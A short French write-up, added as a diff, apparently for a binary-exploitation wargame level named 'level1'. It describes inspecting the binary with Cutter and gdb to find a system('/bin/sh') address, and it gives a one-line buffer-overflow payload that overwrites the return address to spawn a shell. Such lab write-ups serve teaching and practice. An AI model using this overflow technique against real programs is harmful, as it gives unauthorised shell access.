@@ -1,0 +1,4 @@
+on ouvre le programme a l'aide de cutter pour voir la consctruction du binaire
+et ensuite a l'aide de gdb on va recuperer l'address de la commande system(/bin/sh).
+
+cat <(python -c "print('A' * 76 + '\x72\x84\x04\x08')") - | ./level1
